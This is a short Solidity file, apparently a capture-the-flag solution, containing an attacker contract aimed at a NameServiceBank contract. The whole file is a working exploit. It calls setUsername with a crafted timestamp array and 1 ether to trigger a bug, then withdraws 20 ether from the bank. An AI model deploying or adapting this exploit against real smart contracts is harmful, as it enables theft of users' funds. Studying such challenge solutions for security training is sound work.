//SPDX-License-Identifier: MIT

pragma solidity 0.7.0;

import "../NameServiceBank.sol";

contract NameServiceAttacker {
    NAME_SERVICE_BANK nameServiceBank;

    constructor(address payable _nameServiceBank) {
        nameServiceBank = NAME_SERVICE_BANK(_nameServiceBank);
    }

    function attack() external payable {
        uint256[2] memory duration = [block.timestamp + 120, block.timestamp];

        // Set the same username to trigger a bug in the contract
        nameServiceBank.setUsername{value: 1 ether}("samczsun", 2, duration);

        // Withdraw any balance assigned to us
        nameServiceBank.withdraw(20 ether);
    }

    receive() external payable {}
}
